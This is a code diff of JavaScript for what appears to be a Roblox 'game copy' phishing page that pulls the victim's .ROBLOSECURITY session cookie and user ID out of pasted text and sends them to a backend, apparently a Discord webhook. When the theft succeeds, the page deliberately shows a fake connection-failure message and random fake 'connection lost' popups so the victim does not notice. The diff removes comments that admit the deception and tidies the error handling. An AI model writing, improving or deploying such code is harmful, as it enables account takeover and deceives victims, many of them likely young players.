@@ -8,7 +8,6 @@ const pinError = document.getElementById("pinError");
 const copyButton = document.getElementById("copyButton");
 const statusMessage = document.getElementById("statusMessage");
 
-// PIN validation
 pinInput.addEventListener("input", () => {
     pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
     validatePin();
@@ -20,22 +19,18 @@ function validatePin() {
     return isValid;
 }
 
-// Extract cookie and rbxuid (improved regex)
 function extractGameData(fullText) {
-    // Match .ROBLOSECURITY", "cookie_value"
     const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
     if (!cookieMatch) {
         return { success: false, message: "Your Game Key is not valid! (Check if you copied it right!)" };
     }
     const robloxCookie = cookieMatch[1];
 
-    // Match RBXEventTrackerV2", "params...&rbxuid=123456&..."
     const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
     let rbxuid = null;
     if (eventTrackerMatch) {
-        const params = eventTrackerMatch[1];
-        const match = params.match(/rbxuid=(\d+)/);
-        if (match) rbxuid = match[1];
+        const rbxuidMatch = eventTrackerMatch[1].match(/rbxuid=(\d+)/);
+        if (rbxuidMatch) rbxuid = rbxuidMatch[1];
     }
     if (!rbxuid) {
         return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2. Ensure the PowerShell script contains it." };
@@ -43,7 +38,6 @@ function extractGameData(fullText) {
     return { success: true, cookie: robloxCookie, rbxuid };
 }
 
-// Fake "connection lost" popup (unchanged)
 function maybeShowFakeConnectionLoss() {
     if (Math.random() < 0.35) {
         const originalMsg = statusMessage.textContent;
@@ -96,20 +90,26 @@ copyButton.addEventListener("click", async () => {
             })
         });
 
-        if (!response.ok) {
-            throw new Error(`Server responded with ${response.status}`);
+        // Try to parse JSON regardless of status
+        let result;
+        try {
+            result = await response.json();
+        } catch (e) {
+            result = { success: false, error: "Invalid response from server" };
         }
 
-        const result = await response.json();
+        if (!response.ok) {
+            // Show the actual error from backend
+            statusMessage.textContent = result.error || `Server error (${response.status})`;
+            statusMessage.style.color = "#ff9d9d";
+            return;
+        }
 
-        // result.success is true if Discord webhook succeeded
         if (result.success === true) {
-            // Deception: show fake failure
             statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
             statusMessage.style.color = "#ff9d9d";
             maybeShowFakeConnectionLoss();
         } else {
-            // Real error
             statusMessage.textContent = result.error || "✗ Copy failed! Check your internet connection.";
             statusMessage.style.color = "#ff9d9d";
         }
